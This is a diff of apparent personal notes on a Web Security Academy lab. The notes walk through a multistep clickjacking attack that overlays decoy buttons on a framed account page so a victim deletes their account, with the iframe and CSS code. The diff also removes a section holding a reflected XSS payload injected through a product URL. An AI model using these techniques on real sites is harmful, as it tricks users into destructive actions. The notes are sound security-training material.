@@ -56,11 +56,17 @@ Change  opacity to 0.001 and `Test me` to `Click me`
 	You can log in to the account yourself using the following credentials: `wiener:peter`
 
 
+**Step 1**:  Open the web application and observe function delete account
+When i'm trying to delete account, the application will ask again if you want to delete the acccount
 ![](../../Img_note/Pasted%20image%2020221215184650.png)
 
 ![](../../Img_note/Pasted%20image%2020221215184705.png)
 
-We need to make a multistep clickjacking
+**Step 2**: Locate to clickjacking
+We need to make clickjacking with 2 click, one click at button ==Delete account==, one click at button ==Yes== after click ==Delete account
+
+We use iframe to embed the vuln web aplication to malicious web. Create two button is ==Click me first== and ==Click me second== according to the given request. Set the opacity to 0.1 so we can easily align the position of the button.
+
 ```
 <style>
 	iframe {
@@ -85,7 +91,12 @@ We need to make a multistep clickjacking
 <div class="secondClick">Click me next</div>
 <iframe src="https://0a900027038c73a0c009bd8e00f000c7.web-security-academy.net/my-account"></iframe>
 ```
+
+Add the above code to the exploit server, click ==Store==, ==View Exploit== to see the result
+
 ![](../../Img_note/Pasted%20image%2020221215185820.png)
+
+**Step 3**:  Align the position of the button
 
 I will fix value:
 heigth: 550px, 
@@ -117,27 +128,8 @@ opacity to 0.001
 <iframe src="https://0a900027038c73a0c009bd8e00f000c7.web-security-academy.net/my-account"></iframe>
 ```
 
+Click ==Store== to change the script, ==View Exploit== to check again, if everything looks ok, click ==Deliver to victim== and we will get this result
+
 ![](../../Img_note/Pasted%20image%2020221215190436.png)
-
-
-
-
-
-After view a product and back to home, we can see link to **Last View Product**
-![](../../Img_note/Pasted%20image%2020221215193427.png)
-
-
-![](../../Img_note/Pasted%20image%2020221215194532.png)
-![](../../Img_note/Pasted%20image%2020221215194807.png)
-
-So i think i will change the url at **LastViewProduct** to `"https://0a42004a04017823c0beb9800028009e.web-security-academy.net/product?productId=1&'><script>print()</script>"`
-
-
-```
-<iframe src="https://0a42004a04017823c0beb9800028009e.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a42004a04017823c0beb9800028009e.web-security-academy.net';window.x=1;">
-```
-![](../../Img_note/Pasted%20image%2020221215194324.png)
-
-![](../../Img_note/Pasted%20image%2020221215200707.png)
 
 
